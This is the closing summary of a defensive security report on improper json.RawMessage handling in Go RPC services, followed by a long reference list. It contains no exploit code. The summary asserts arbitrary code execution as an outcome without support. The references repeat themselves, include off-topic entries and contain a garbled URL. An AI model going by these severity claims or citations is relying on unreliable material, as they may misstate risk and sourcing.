The vulnerability concerning improper `json.RawMessage` handling in Go RPC applications represents a significant security risk, primarily leading to insecure deserialization and various injection attacks. While `json.RawMessage` is a legitimate and useful feature for deferred JSON parsing, its misuse, particularly in RPC contexts, creates a critical security gap. The core problem lies in the fact that `json.RawMessage` holds raw, unvalidated JSON bytes, bypassing Go's inherent type-safe validation during initial unmarshaling. If the application subsequently processes this raw content without explicit and rigorous validation, attackers can inject malicious payloads.

Exploitation goals include arbitrary code execution, denial of service, data tampering, privilege escalation, and client-side JSON injection (XSS). These attacks are often remotely executable with low complexity, making them highly impactful. Common mistakes leading to this vulnerability include a lack of post-unmarshal validation, blind trust in client data, over-reliance on generic types like `map[string]any`, and neglecting security-enhancing `json.Decoder` options.

Remediation requires immediate actions such as thorough code audits, implementing strict post-unmarshal validation, configuring `json.Decoder` for security, and improving error handling. Long-term strategies involve embedding security into the development lifecycle, providing developer training, and integrating automated security testing. Adherence to these practices is crucial for building robust and secure Go RPC applications.

## 16. References

- https://pkg.go.dev/golang.org/x/tools/internal/jsonrpc2_v2
- https://pkg.go.dev/golang.org/x/exp/jsonrpc2
- https://pkg.go.dev/google.golang.org/api/webrisk/v1
- https://cloud.google.com/go/docs/reference/cloud.google.com/go/logging/latest
- https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=json
- https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=%22data+center%22Last
- https://www.infracloud.io/blogs/build-your-own-mcp-server/
- https://pkg.go.dev/vuln/list
- https://pkg.go.dev/encoding/json
- https://www.reddit.com/r/golang/comments/1fl83v3/what_is_the_best_way_to_handle_json_in_golang/
- https://talosintelligence.com/vulnerability_reports/TALOS-2017-0471
- https://security.snyk.io/vuln/SNYK-GOLANG-GOLANGORGXNETHTTPHTTPPROXY-9058601
- https://arxiv.org/html/2506.00274v1
- https://stackoverflow.com/questions/33663884/can-i-modify-json-rawmessage
- https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=deserialization
- https://pkg.go.dev/vuln/list
- https://hub.corgea.com/articles/go-lang-security-best-practices
- https://go.dev/doc/security/best-practices
- https://pkg.go.dev/encoding/json
- https://pkg.go.dev/vuln/GO-2022-0972
- https://docs.extrahop.com/9.6/eh-admin-ui-guide/
- https://stackoverflow.com/questions/27994327/golang-json-unmarshal-unexpected-end-of-json-input
- https://pkg.go.dev/k8s.io/kube-openapi/pkg/internal/third_party/go-json-experiment/json
- https://www.invicti.com/learn/json-injection/
- https://pkg.go.dev/github.com/sourcegraph/jsonrpc2
- https://cloud.google.com/go/docs/reference/cloud.google.com/go/logging/latest
- https://nikhilakki.in/json-manipulation-in-go
- https://yalantis.com/blog/speed-up-json-encoding-decoding/
- https://go.libhunt.com/cbor-alternatives
- https://help.fluidattacks.com/portal/en/kb/articles/criteria-fixes-go-096
- https://stackoverflow.com/questions/31131171/unmarshaling-nested-json-string-use-json-rawmessage
- https://github.com/jmorganca/ollama/blob/main/api/types.go
- https://www.alexedwards.net/blog/how-to-properly-parse-a-json-request-body
- https://betterstack.com/community/guides/scaling-go/json-in-go/
- https://pkg.go.dev/vuln/list
- https://pkg.go.dev/net/rpc
- https://moldstud.com/articles/p-go-json-handling-a-quick-reference-cheat-sheet-for-developers
- https://pkg.go.dev/encoding/json
- https://stackoverflow.com/questions/75099156/unmarshal-json-in-json-in-go
- https://dev.to/arshamalh/how-to-unmarshal-json-in-a-custom-way-in-golang-42m5
- https://pkg.go.dev/connectrpc.com/validate
- https://github.com/apex/rpc/blob/master/validate.go
- https://go.dev/doc/database/sql-injection
- https://www.pullrequest.com/blog/preventing-sql-injection-in-golang-a-comprehensive-guide/
- https://yalantis.com/blog/speed-up-json-encoding-decoding/
- https://nikhilakki.in/json-manipulation-in-go
- https://stackoverflow.com/questions/48653941/what-is-the-meaning-of-json-rawmessage
- https://www.ory.sh/docs/open-source/guidelines/rest-api-guidelines